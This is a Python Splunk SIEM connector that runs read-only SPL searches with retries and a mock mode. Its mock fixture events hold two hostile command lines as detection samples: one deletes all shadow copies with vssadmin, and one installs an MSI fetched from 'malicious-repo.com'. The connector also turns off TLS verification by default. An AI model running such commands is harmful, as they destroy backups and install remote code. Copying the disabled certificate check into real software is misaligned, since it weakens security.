import time
import httpx
from typing import List, Dict, Any, Optional

from app.connector.base_connector import (
    BaseConnector,
    ConnectorConfig,
    ConnectorRegistry,
)
from app.connector.exceptions import (
    ConnectorTransientError,
    ConnectorPermanentError,
    ConnectorResponseError,
)


_RETRYABLE_STATUS_CODES = {429, 500, 502, 503, 504}


class SplunkConnector(BaseConnector):
    """
    Splunk SIEM Connector implementing read-only SPL query execution,
    polling, and connection verification via Splunk REST API.

    Supports:
        - Mock mode for offline testing
        - Centralized retry handling
        - Circuit breaker protection
        - Graceful fallback on connector failure
    """

    def __init__(self, config: ConnectorConfig):
        super().__init__(config)

        self.host = self.config.credentials.get("host", "").rstrip("/")
        self.port = self.config.credentials.get("port", 8089)
        self.token = self.config.credentials.get("token")
        self.username = self.config.credentials.get("username")
        self.password = self.config.credentials.get("password")

        self.is_mock = self.config.credentials.get(
            "mock",
            not bool(self.host),
        )

        self.verify_ssl = self.config.credentials.get(
            "verify_ssl",
            False,
        )

        self.base_url = (
            f"{self.host}:{self.port}"
            if self.host
            else ""
        )

    def _get_auth_headers(self) -> Dict[str, str]:
        headers: Dict[str, str] = {}

        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        return headers

    def _get_auth_tuple(self) -> Optional[tuple]:
        if not self.token and self.username and self.password:
            return self.username, self.password

        return None

    def _raise_for_status(
        self,
        response: httpx.Response,
        context: str,
        allowed_status_codes: set[int],
    ) -> None:
        """
        Convert HTTP failures into connector-specific exceptions.

        Retryable:
            429, 5xx

        Permanent:
            Other 4xx responses

        Response:
            Unexpected non-success responses outside the above classes.
        """

        if response.status_code in allowed_status_codes:
            return

        message = (
            f"{context}: HTTP {response.status_code} "
            f"{response.text[:200]}"
        )

        if response.status_code in _RETRYABLE_STATUS_CODES:
            raise ConnectorTransientError(message)

        if 400 <= response.status_code < 500:
            raise ConnectorPermanentError(message)

        raise ConnectorResponseError(message)

    def validate_connection(self) -> bool:
        """
        Verify Splunk credentials using the centralized resilience layer.

        On failure, return False as graceful degraded execution.
        """

        if self.is_mock:
            return True

        return self.execute_with_resilience(
            self._validate_connection_remote,
            fallback=lambda error=None: False,
        )

    def _validate_connection_remote(self) -> bool:
        url = (
            f"{self.base_url}"
            "/services/authentication/current-context"
            "?output_mode=json"
        )

        try:
            with httpx.Client(
                verify=self.verify_ssl,
                timeout=10.0,
            ) as client:
                response = client.get(
                    url,
                    headers=self._get_auth_headers(),
                    auth=self._get_auth_tuple(),
                )

        except httpx.TimeoutException as exc:
            raise ConnectorTransientError(
                f"Splunk connection timeout: {exc}"
            ) from exc

        except httpx.NetworkError as exc:
            raise ConnectorTransientError(
                f"Could not reach Splunk: {exc}"
            ) from exc

        except httpx.HTTPError as exc:
            raise ConnectorTransientError(
                f"Splunk HTTP client error: {exc}"
            ) from exc

        self._raise_for_status(
            response,
            "Splunk connection validation failed",
            {200},
        )

        return True

    def query(
        self,
        query_str: str,
        time_range: tuple = (None, None),
    ) -> List[Dict[str, Any]]:
        """
        Execute a read-only SPL query through the centralized
        resilience layer.

        Fallback:
            Return an empty result set on degraded execution.
        """

        if self.is_mock:
            return self._query_mock(
                query_str,
                time_range,
            )

        return self.execute_with_resilience(
            self._query_remote,
            query_str,
            time_range,
            fallback=lambda error=None: [],
        )

    def _query_remote(
        self,
        query_str: str,
        time_range: tuple,
    ) -> List[Dict[str, Any]]:
        earliest_time, latest_time = time_range

        search_url = f"{self.base_url}/services/search/jobs"

        data = {
            "search": (
                f"search {query_str}"
                if not query_str.strip().startswith("search")
                else query_str
            ),
            "output_mode": "json",
        }

        if earliest_time:
            data["earliest_time"] = str(earliest_time)

        if latest_time:
            data["latest_time"] = str(latest_time)

        try:
            with httpx.Client(
                verify=self.verify_ssl,
                timeout=30.0,
            ) as client:

                # 1. Dispatch search job
                response = client.post(
                    search_url,
                    data=data,
                    headers=self._get_auth_headers(),
                    auth=self._get_auth_tuple(),
                )

                self._raise_for_status(
                    response,
                    "Splunk search job creation failed",
                    {200, 201},
                )

                try:
                    job_data = response.json()
                except ValueError as exc:
                    raise ConnectorResponseError(
                        "Splunk returned invalid JSON while creating "
                        "the search job"
                    ) from exc

                sid = job_data.get("sid")

                if not sid:
                    raise ConnectorResponseError(
                        "Splunk search job response did not contain a SID"
                    )

                # 2. Poll search job status
                status_url = (
                    f"{self.base_url}"
                    f"/services/search/jobs/{sid}"
                    "?output_mode=json"
                )

                job_completed = False

                for _ in range(30):
                    status_response = client.get(
                        status_url,
                        headers=self._get_auth_headers(),
                        auth=self._get_auth_tuple(),
                    )

                    self._raise_for_status(
                        status_response,
                        "Splunk search job status request failed",
                        {200},
                    )

                    try:
                        status_data = status_response.json()
                    except ValueError as exc:
                        raise ConnectorResponseError(
                            "Splunk returned invalid JSON while checking "
                            "search job status"
                        ) from exc

                    entry = status_data.get(
                        "entry",
                        [{}],
                    )[0]

                    dispatch_state = entry.get(
                        "content",
                        {},
                    ).get("dispatchState")

                    if dispatch_state == "DONE":
                        job_completed = True
                        break

                    time.sleep(1.0)

                if not job_completed:
                    raise ConnectorTransientError(
                        "Splunk search job did not complete within "
                        "the allowed polling window"
                    )

                # 3. Retrieve search results
                results_url = (
                    f"{self.base_url}"
                    f"/services/search/jobs/{sid}/results"
                    "?output_mode=json"
                )

                results_response = client.get(
                    results_url,
                    headers=self._get_auth_headers(),
                    auth=self._get_auth_tuple(),
                )

                self._raise_for_status(
                    results_response,
                    "Splunk search results request failed",
                    {200},
                )

                try:
                    results_data = results_response.json()
                except ValueError as exc:
                    raise ConnectorResponseError(
                        "Splunk returned invalid JSON for search results"
                    ) from exc

                return results_data.get(
                    "results",
                    [],
                )

        except httpx.TimeoutException as exc:
            raise ConnectorTransientError(
                f"Splunk query timeout: {exc}"
            ) from exc

        except httpx.NetworkError as exc:
            raise ConnectorTransientError(
                f"Could not reach Splunk: {exc}"
            ) from exc

        except httpx.HTTPError as exc:
            raise ConnectorTransientError(
                f"Splunk HTTP client error: {exc}"
            ) from exc

    def poll(self) -> List[Dict[str, Any]]:
        """
        Pull new events since the last poll.

        Polling reuses the resilient query path, so it automatically
        benefits from retry, circuit breaker, and fallback handling.
        """

        now = time.time()

        start_ts = (
            self._last_poll_ts
            if self._last_poll_ts is not None
            else now - 300
        )

        results = self.query(
            "index=* | head 100",
            time_range=(start_ts, now),
        )

        self._last_poll_ts = now

        return results

    def _query_mock(
        self,
        query_str: str,
        time_range: tuple,
    ) -> List[Dict[str, Any]]:
        """Mock SPL search execution using fixture telemetry matching."""

        mock_events = [
            {
                "host": "WORKSTATION-01",
                "Image": r"C:\Windows\System32\vssadmin.exe",
                "CommandLine": (
                    "vssadmin.exe delete shadows /all /quiet "
                    "-encrypt"
                ),
                "User": r"NT AUTHORITY\SYSTEM",
                "_time": "2026-07-15T10:00:00Z",
                "index": "windows",
            },
            {
                "host": "WORKSTATION-02",
                "Image": r"C:\Windows\System32\msiexec.exe",
                "CommandLine": (
                    "msiexec.exe /i "
                    "http://malicious-repo.com/setup.msi "
                    "-install"
                ),
                "User": r"DOMAIN\user1",
                "_time": "2026-07-15T10:05:00Z",
                "index": "windows",
            },
        ]

        query_lower = query_str.lower()

        results = []

        for event in mock_events:
            cmd_match = False
            img_match = False

            if (
                "-encrypt" in query_lower
                or "cipher /e" in query_lower
            ):
                if "-encrypt" in event["CommandLine"].lower():
                    cmd_match = True

            elif (
                "msiexec" in query_lower
                or "/i" in query_lower
            ):
                if (
                    "msiexec" in event["Image"].lower()
                    or "/i" in event["CommandLine"].lower()
                ):
                    cmd_match = True

            else:
                cmd_match = True

            if "vssadmin.exe" in query_lower:
                if (
                    "vssadmin.exe"
                    in event["Image"].lower()
                ):
                    img_match = True
            else:
                img_match = True

            if cmd_match and img_match:
                results.append(event)

        return results


ConnectorRegistry.register(
    "splunk",
    SplunkConnector,
)